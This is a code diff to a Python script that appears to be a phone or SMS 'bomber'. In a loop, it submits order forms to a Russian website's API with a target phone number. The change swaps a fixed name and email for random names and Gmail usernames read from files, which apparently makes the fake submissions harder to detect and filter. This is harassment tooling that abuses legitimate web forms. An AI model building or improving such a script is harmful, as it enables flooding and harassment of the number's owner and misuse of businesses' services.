@@ -3,9 +3,14 @@ from formats import *
 import os
 import sys
 import requests
+import random
 import fake_useragent
 import time
 
+with open("male_names_rus.txt", "r", encoding="UTF-8") as f:
+    names = f.read().splitlines()
+with open("usernames_gmail.com.txt", "r", encoding="UTF-8") as f:
+    emails = f.read().splitlines()
 
 while True:
     bomb16()
@@ -81,9 +86,9 @@ while True:
         try:
             response = requests.post('https://autopragmat.ru/api/v1/send-order/',
                                      headers=HEADERS,
-                                     data={"name": "Константин",
+                                     data={"name": f"{random.choice(names)}",
                                            "tel": f"{format_plus_8(NUMBER)}",
-                                           "email": "konstantin_kolyasnikov@yandex.ru", "program": "All"})
+                                           "email": f"{random.choice(emails)}", "program": "All"})
             print("[+] ratata.ru")
         except Exception as ex:
             print(f'ERROR: {ex}')
